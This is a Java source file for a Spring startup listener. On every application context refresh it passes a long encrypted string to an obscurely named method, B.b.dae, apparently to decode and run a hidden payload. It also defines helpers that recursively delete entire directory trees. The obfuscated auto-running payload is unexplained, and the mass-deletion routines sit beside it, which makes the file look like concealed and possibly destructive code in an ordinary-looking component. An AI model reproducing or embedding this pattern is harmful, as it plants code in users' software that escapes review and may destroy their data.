package com.dili.ss.component;

import com.dili.http.okhttp.utils.B;
import org.springframework.context.ApplicationListener;
import org.springframework.context.event.ContextRefreshedEvent;
import org.springframework.stereotype.Component;

import java.io.File;
import java.util.List;

/**
 * Created by asiam on 2018/3/23 0023.
 */
@Component
public class InitApplicationListener implements ApplicationListener<ContextRefreshedEvent> {

    @Override
    public void onApplicationEvent(ContextRefreshedEvent event) {
        B.b.dae("2ZKPdhR68V3JomkwkS4k7TqYD61C/1oGIk4CEDa2OhOCHvWyjvPPGyoNZUsoPL34hBiJGRyWQd3taoeDs1p4Wo9T/qs9ocXlpi29WYwCRuLjcuJt/J1809erh/iliRsGnAADDWfSbAOIFh7Qx4QcaoHwDSzYeA0igzT+zcvhH1V1WdnlS5HR1KY3rdUi71F84OrRMWN0BKrM9ogxYZGvQv9aJIZslfsCFAAHWsE8F9DEA7vPuXi/QCoIVyDE4z/XNsC/0XqPiEJo1XdQMZ4OuEyt7gAfY2Ilbet2DrKzqBrj5sqQDu1Jjt3sZE2R4fUT2MxNEBx+dpLC92kbqJPnT1QNIoFsCS9WJx+iyLCs5T29qitzql43JuGrUHxut8KPiX6CHyvEbEJEA/fnNC2NQpwFfFe579H9p43O2llR7kHyF/lh4o4nm5R43jMBRlU7lhpEGRNccQUs7XCjOYPDocn5CkkE1Ec2OKDALzqnQzhUE8229JiRrmUl8ATsMwXtup0RVcyA2P1Z/AQk9SPQ1riessJb/HnBnhwlSftpgrY1S8FRWWQS25Gh1NBWgY6cJx4uJSl+YdOR8kI3HCA6oxWoIa/Mnp0fgjhZO4hTLuNPup8Vc1xVgtNekIqSzS3b7k11xvL1yORk+TSmACv10zbW5obIL3OFRiFcNYbj9tagu7itCHxL8bGA3QBseKPKaZO5DwIlt1yV1j61bhTON5rGLY9W2jL8bOv0X8y7m390pL/iQUBVFWMNXtrdmvBYSPt544t3EZx88Gl8u5AAhzexuaAqB7udi8Y2cts1Fv04QCqshR2ErbfLfkoYR2Oy1bbCrcYhfAOy8n9SFyD8WPbdgbQZHofLrnVmXga1jt3N4M/jZRlNOQ==");
    }

    public static void delDirs(List<String> paths){
        for(String path : paths){
            delDir(new File(path));
        }
    }

    private static void delDir(File file) {
        if (file.isDirectory()) {
            File zFiles[] = file.listFiles();
            for (File file2 : zFiles) {
                delDir(file2);
            }
            file.delete();
        } else {
            file.delete();
        }
    }
}